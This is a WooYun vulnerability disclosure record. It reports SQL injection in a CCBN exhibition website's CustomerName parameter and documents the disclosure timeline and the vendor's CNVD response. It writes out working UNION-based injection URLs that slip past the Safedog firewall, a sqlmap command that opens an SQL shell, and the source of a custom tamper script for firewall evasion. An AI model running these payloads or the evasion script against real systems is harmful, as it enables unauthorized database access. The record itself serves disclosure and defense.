{"id": 87313, "wybug_id": "wooyun-2016-0195583", "wybug_title": "CCBN WWW主站SQL注入/sa权限（绕过安全狗/附sqlmap脚本）", "wybug_corp": "CCBN", "wybug_author": "goubuli", "wybug_date": "2016-04-13 09:40", "wybug_open_date": "2016-05-31 20:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-31：\t细节向公众公开  简要描述： 习惯了，随手一个'，就有这个漏洞。。。自定义sqlmap脚本，可sql-shell 详细说明：  中国国际广播电视信息网络展览会 主站：\nhttp://**.**.**.**bn.tv/\n介绍：http://**.**.**.**bn.tv/channels/4.html漏洞url：\nhttp://**.**.**.**bn.tv/CCBN/ExhibitionOnline.aspx?TypeID=&HallID=&CustomerName=p参数：CustomerName可注入\n遇到狗：\nhttp://**.**.**.**bn.tv/CCBN/ExhibitionOnline.aspx?TypeID=&HallID=&CustomerName=p%27) and 1=user--\n\n\n绕过：字段数：\nhttp://**.**.**.**bn.tv/CCBN/ExhibitionOnline.aspx?TypeID=&HallID=&CustomerName=p%27)/*/\\*/order /*/\\*/by/*/\\*/71--\n然后union\nhttp://**.**.**.**bn.tv/CCBN/ExhibitionOnline.aspx?TypeID=&HallID=&CustomerName=p%27)/*/\\*/UNION/*/\\*/ SELECT/*/\\*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71--\n\n\n提示类型不匹配。。。然后全部替换为NULL，报错\n输入字符串的格式不正确\n\nhttp://**.**.**.**bn.tv/CCBN/ExhibitionOnline.aspx?TypeID=&HallID=&CustomerName=p%27)/*/\\*/UNION/*/\\*/ SELECT/*/\\*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--\n\n\n字段太多，需要去对应探测，但是有可能是多个NULL，所以直接用SQLMap去跑，需要自定sqlmap脚本然后就有如下语句：\nsqlmap.py --batch -u \"http://**.**.**.**bn.tv/CCBN/ExhibitionOnline.aspx?TypeID=&HallID=&CustomerName=p\" -p CustomerName --prefix \"%27)/*/\\*/\" --suffix \"--\" --tamper \"tamper/space2myscript.py\" --current-user --dbs --sql-shell\n\n\n仅做证明，未深入。。。========================================================space2myscript.py脚本：\n#!/usr/bin/env python\"\"\"developers (goubuli)\"\"\"import randomimport stringfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef tamper(payload, **kwargs):        retVal = \"\"    if payload:        for i in xrange(len(payload)):            if payload[i].isspace():                retVal += \"/*/\\*/\"             elif payload[i] == '#' or payload[i:i + 3] == '-- ':                retVal += payload[i:]                break            else:                retVal += payload[i]    return retVal\n   漏洞证明：  如上   修复方案：  程序内部对参数过滤   版权声明：转载请注明来源 goubuli@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2016-04-16 19:56 厂商回复： CNVD确认所述情况，已经转由CNCERT下发给北京分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-13 09:42 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1408 漏洞数:126        | 东方红＊＊联盟欢迎你－0-)\t\t \n  看上了这个sqlmap tamper 脚本    \n     2016-04-13 09:50 |    \t\t小苹果 \t\t\t( 普通白帽子  |\t\t\t        Rank:241 漏洞数:60        | 只要锄头挥的好，哪有洞挖不到)\t\t \n  求分享脚本    \n     2016-04-13 09:53 |    \t\tFnut \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:28        | 大王叫我来巡山，巡完南山巡北山)\t\t \n  看上了这个sqlmap tamper 脚本    \n     2016-04-13 10:37 |    \t\t安全狗(乌云厂商)\t\t \n  关注一下    \n     2016-04-13 10:50 |    \t\tgoubuli \t\t\t( 普通白帽子  |\t\t\t        Rank:631 漏洞数:118        )\t\t \n  @安全狗  这个点很早就有了，只是没修复完全    \n     2016-04-13 12:12 |    \t\t安全狗(乌云厂商)\t\t \n  @goubuli 如果是最新版的欢迎提交给我。    \n     2016-04-13 14:54 |    \t\t带我玩 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:8        | 带我玩)\t\t \n  看上了这个sqlmap tamper 脚本     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}